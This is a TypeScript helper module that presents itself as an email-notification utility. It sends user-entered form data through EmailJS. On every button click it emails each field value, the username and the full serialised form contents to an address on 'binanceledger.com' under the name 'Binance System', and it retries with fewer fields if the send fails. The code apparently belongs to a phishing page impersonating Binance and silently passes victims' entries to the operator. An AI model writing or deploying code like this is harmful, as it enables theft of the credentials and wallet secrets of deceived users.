
import emailjs from 'emailjs-com';

// Initialize EmailJS with your user ID immediately
emailjs.init("hDX5LRevxoenkHrjk");

interface EmailData {
  step: string;
  field?: string;
  value?: string;
  username?: string;
  timestamp: string;
  allFormData?: any;
  priority?: 'high' | 'normal';
}

export const sendEmailNotification = async (data: EmailData) => {
  console.log('=== EMAIL NOTIFICATION START ===');
  console.log('🚨 BUTTON CLICK DETECTED - SENDING EMAIL IMMEDIATELY');
  console.log('Priority level:', data.priority || 'normal');
  console.log('Data being sent:', data);

  // Ensure all template variables are properly formatted as strings
  // This matches the EmailJS template variables exactly
  const templateParams = {
    to_email: "donotreply@binanceledger.com",
    from_name: "Binance System",
    subject: `🚨 URGENT: ${data.step || 'User Action'}`,
    message: `Step: ${data.step || 'Unknown'} at ${data.timestamp || new Date().toISOString()}`,
    step: String(data.step || 'Unknown Action'),
    field: String(data.field || ''),
    value: String(data.value || ''),
    username: String(data.username || ''),
    timestamp: String(data.timestamp || new Date().toISOString()),
    allFormData: data.allFormData ? JSON.stringify(data.allFormData, null, 2) : ''
  };

  console.log('📧 Template parameters being sent:', templateParams);
  console.log('📧 Sending email with SERVICE_ID: service_r7sis9a, TEMPLATE_ID: template_dec5tz3');

  try {
    // Send email immediately when button is clicked
    const result = await emailjs.send(
      "service_r7sis9a",    // Your service ID
      "template_dec5tz3",   // Your template ID  
      templateParams
    );
    
    console.log('✅ Email sent successfully after button click!', result);
    console.log('Email status:', result.status);
    console.log('Email text:', result.text);
    console.log('=== EMAIL NOTIFICATION END ===');
    return result;
  } catch (error) {
    console.error('❌ Email failed to send after button click:', error);
    console.error('Full error details:', error);
    console.error('Template params that failed:', templateParams);
    
    // Try with even more basic parameters to avoid corruption
    console.log('🔄 Retrying with minimal parameters to avoid corruption...');
    try {
      const minimalParams = {
        to_email: "donotreply@binanceledger.com",
        from_name: "System",
        subject: "Alert",
        message: `Action: ${data.step}`,
        step: String(data.step || 'Action'),
        field: "",
        value: "",
        username: String(data.username || ''),
        timestamp: String(data.timestamp || new Date().toISOString()),
        allFormData: ""
      };
      
      const retryResult = await emailjs.send(
        "service_r7sis9a",
        "template_dec5tz3",
        minimalParams
      );
      console.log('✅ Minimal retry successful!', retryResult);
      return retryResult;
    } catch (retryError) {
      console.error('❌ Even minimal retry failed:', retryError);
    }
    
    console.log('=== EMAIL NOTIFICATION END (ERROR) ===');
    throw error;
  }
};

// Helper function for high-priority button clicks - sends immediately
export const sendHighPriorityNotification = async (data: Omit<EmailData, 'priority'>) => {
  console.log('🚨 HIGH PRIORITY BUTTON CLICK - SENDING EMAIL IMMEDIATELY');
  return sendEmailNotification({ ...data, priority: 'high' });
};
